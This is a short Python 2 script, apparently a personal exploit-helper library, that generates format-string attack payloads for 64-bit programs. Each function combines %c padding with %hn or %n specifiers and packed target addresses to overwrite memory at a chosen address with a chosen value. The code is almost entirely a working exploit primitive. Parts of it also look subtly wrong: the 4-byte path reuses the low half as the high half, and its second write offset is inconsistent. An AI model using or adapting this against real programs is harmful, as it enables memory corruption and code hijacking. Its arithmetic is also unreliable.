from struct import pack
import logging
#---------------------------#
# 	  Make by py0zz1
# 	py0zz1.tistory.com
# 	peeper830@gmail.com
#---------------------------#
max_6 = 0xffffffffffff
max_4 = 0xffffffff
max_2 = 0xffff

def place_value_calc(value,byte):

	if byte == 6:
		value_low = value & 0xffff
		value_mid = (value >> 16) & 0xffff
		value_high = (value >> 32) & 0xffff
		low = value_low
		if value_low > value_mid:
			mid = 0x10000 + value_mid - value_low
		else:
			mid = value_mid - value_low
	
		if value_mid > value_high:
			high = 0x10000 + value_high - value_mid
		else:
			high = value_high - value_mid
	
		return low,mid,high

	else:
		value_low = value & 0xffff
		value_high = value & 0xffff
		
		low = value_low
		if value_low > value_high:
			high = 0x10000 + value_high - value_low
		else:
			high = value_high - value_low

		return low,high


def exp_6(offset,value,address):
	if max_6 < value:
		logging.warning("Only 6Byte Value!")
	else:
		value_low,value_mid,value_high = place_value_calc(value,6)
		w_offset = offset + 5 # 40byte Static Length

		exp = "%{}c".format(value_low)
		exp += "%{}$hn".format(w_offset)
		exp += "%{}c".format(value_mid)
		exp += "%{}$hn".format(w_offset+1)
		exp += "%{}c".format(value_high)
		exp += "%{}$hn".format(w_offset+2)
		exp += "p"*(8-len(exp)%8)
		#print len(exp)
		exp += pack("<Q",address)
		exp += pack("<Q",address+2)
		exp += pack("<Q",address+4)
		return exp

def exp_4(offset,value,address):
	
	if max_4 < value:
		logging.warning("Only 4Byte Value!")
	else:
		
		value_low,value_high = place_value_calc(value,4)
		w_offset = offset + 4 # 32byte Static Length
	
		exp = "%{}c".format(value_low)
		exp += "%{}$hn".format(w_offset)
		exp += "%{}c".format(value_high)
		exp += "%{}$hn".format(w_offset+2)
		exp += "p"*(8-len(exp)%8)
		#print len(exp)
		exp += pack("<Q",address)
		exp += pack("<Q",address+2)
	
		return exp

def exp_4L(offset,value,address):
	if max_4 < value:
		logging.warning("Only 4Byte Value!")
	else:
		w_offset = offset + 2 # 16byte Static Length

		exp = "%{}c".format(value)
		exp += "%{}$n".format(w_offset)
		exp += "p"*(8-len(exp)%8)
		print len(exp)
		exp += pack("<Q",address)

		return exp

def exp_2(offset,value,address):
	if value > 0xffff:
		logging.warning("Only 2Byte Value!")
	else:
		w_offset = offset + 2 # 16byte Static Length

		exp = "%{}c".format(value)
		exp += "%{}$hn".format(w_offset)
		exp += "p"*(8-len(exp)%8)
		#print len(exp)
		exp += pack("<Q",address)
		return exp
